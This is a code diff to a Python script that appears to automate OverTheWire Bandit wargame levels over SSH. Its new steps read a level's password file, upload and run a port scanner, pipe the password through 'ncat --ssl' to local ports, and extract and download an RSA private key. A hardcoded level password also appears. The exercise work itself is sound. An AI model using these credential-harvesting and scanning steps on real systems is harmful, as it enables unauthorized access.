@@ -241,10 +241,10 @@ def bandit13_14(client):
     subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit13_14')
 
     sftp = client.open_sftp()
-    sftp.get('/home/bandit13/sshkey.private',os.path.join(subfolder_path,'sshkey.private'))
+    sftp.get('/home/bandit13/sshkey.private',os.path.join(subfolder_path,'id_rsa'))
 
     # Process to obtain the ssh key file
-    next_password = os.path.join(str(subfolder_path),'sshkey.private')
+    next_password = os.path.join(str(subfolder_path),'id_rsa')
 
     client.close()
 
@@ -282,13 +282,36 @@ def bandit15_16(client):
 
     return next_user, next_password
 
+# DONE
 def bandit16_17(client):
 
     next_user = "bandit17"
-
-    # Process to obtain the password
-    stdin, stdout, stderr = client.exec_command("")
-    next_password = stdout.read().decode().strip()
+    
+    stdin, stdout, stderr = client.exec_command("mktemp -d")
+    temp_dir = stdout.read().decode().strip()
+    
+    utils_path = os.path.join(os.path.dirname(__file__),'utils')
+    
+    sftp = client.open_sftp()
+    sftp.put(os.path.join(utils_path,'portScan.sh'), temp_dir + '/portScan.sh')
+        
+    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit16")
+    current_password = stdout.read().decode().strip()
+    
+    stdin, stdout, stderr = client.exec_command("chmod +x " + temp_dir + "/portScan.sh")
+    stdin, stdout, stderr = client.exec_command(temp_dir + "/portScan.sh > " + temp_dir + "/ports.txt")
+    stdout.channel.recv_exit_status() # Wait until the command finish
+    
+    stdin, stdout, stderr = client.exec_command("for port in $(cat " + temp_dir + "/ports.txt); do (echo " + current_password + " | ncat --ssl localhost $port 2>/dev/null | sed -n '/-----BEGIN RSA PRIVATE KEY-----/,/-----END RSA PRIVATE KEY-----/p'); done > " + temp_dir + "/id_rsa")
+    stdout.channel.recv_exit_status() # Wait until the command finish
+    
+    # id_rsa file retieve
+    resources_path = createResourcesFolder()
+    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit16_17')
+    sftp = client.open_sftp()
+    sftp.get(temp_dir+'/id_rsa',os.path.join(subfolder_path,'id_rsa'))
+    
+    next_password = os.path.join(str(subfolder_path),'id_rsa')
 
     client.close()
 
@@ -299,7 +322,7 @@ def bandit17_18(client):
     next_user = "bandit18"
 
     # Process to obtain the password
-    stdin, stdout, stderr = client.exec_command("")
+    stdin, stdout, stderr = client.exec_command("whoami")
     next_password = stdout.read().decode().strip()
 
     client.close()
@@ -491,9 +514,9 @@ def printCredentials():
 
 if __name__ == '__main__':
     # DEBUG
-    user = "bandit16"
-    password = "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx"
-    # password = "D:\\Proyectos\\owt_bandit_autopwn\\OWT_Bandit_AutoPwn\\resources\\bandit13_14\\sshkey.private"
+    user = "bandit17"
+    # password = "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx"
+    password = "D:\\Proyectos\\owt_bandit_autopwn\\OWT_Bandit_AutoPwn\\resources\\bandit16_17\\id_rsa"
 
     # user, password = bandit11_12(ssh_connection(user,password))
     # printCredentials()
@@ -510,11 +533,11 @@ if __name__ == '__main__':
     # user, password = bandit15_16(ssh_connection(user,password))
     # printCredentials()
 
-    user, password = bandit16_17(ssh_connection(user,password))
-    printCredentials()
-
-    # user, password = bandit17_18(ssh_connection(user,password))
+    # user, password = bandit16_17(ssh_connection(user,password))
     # printCredentials()
+
+    user, password = bandit17_18(ssh_connection(user,password,use_ssh_key=True,sshkey_file=password))
+    printCredentials()
 
     # user, password = bandit18_19(ssh_connection(user,password))
     # printCredentials()
